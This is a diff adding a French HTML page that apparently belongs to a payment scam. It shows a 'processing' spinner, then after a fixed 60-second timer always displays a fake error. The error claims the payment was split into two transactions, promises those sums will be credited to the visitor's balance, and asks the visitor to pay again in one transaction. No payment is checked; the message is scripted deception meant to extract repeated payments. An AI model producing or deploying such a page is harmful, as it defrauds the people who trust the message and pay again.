@@ -1,0 +1,85 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Traitement en cours...</title>
+  <link rel="stylesheet" href="styles.css">
+
+  <style>
+    /* Style pour centrer le loader et le message */
+    .loader-container {
+      height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      text-align: center;
+      padding: 20px;
+    }
+
+    /* Style pour le cercle de chargement */
+    .loader {
+      border: 6px solid #e3e3e3;
+      border-top: 6px solid #2b8a63;
+      border-radius: 50%;
+      width: 70px;
+      height: 70px;
+      animation: spin 1s linear infinite;
+      margin-bottom: 20px;
+    }
+
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    /* Style pour le message d'erreur */
+    .error-box {
+      background: #ffe6e6;
+      border-left: 6px solid #cc0000;
+      padding: 20px;
+      margin-top: 20px;
+      max-width: 480px;
+      border-radius: 6px;
+      color: #cc0000;
+      font-weight: 600;
+    }
+
+    /* Cacher les sections par défaut */
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Section de chargement -->
+  <div class="loader-container" id="loadingSection">
+    <div class="loader"></div>
+    <p>Veuillez patienter quelques minutes pendant que nous traitons votre requête.</p>
+  </div>
+
+  <!-- Section d'erreur affichée après 60 secondes -->
+  <div class="loader-container hidden" id="errorSection">
+    <div class="error-box">
+      Le paiement a été fait en deux transactions.<br><br>
+      Pour que notre système reconnaisse le paiement, le paiement doit se faire en <strong>une seule transaction</strong>.<br><br>
+      Les transactions que vous venez de faire seront ajoutées automatiquement à votre solde total.<br><br>
+      Veuillez reprendre le paiement s'il vous plaît.
+    </div>
+  </div>
+
+  <script>
+    // Après 60 secondes, afficher l'erreur
+    setTimeout(() => {
+      // Cacher la section de chargement
+      document.getElementById("loadingSection").classList.add("hidden");
+      
+      // Afficher la section d'erreur
+      document.getElementById("errorSection").classList.remove("hidden");
+    }, 60000); // 60000 ms = 1 minute
+  </script>
+
+</body>
+</html>
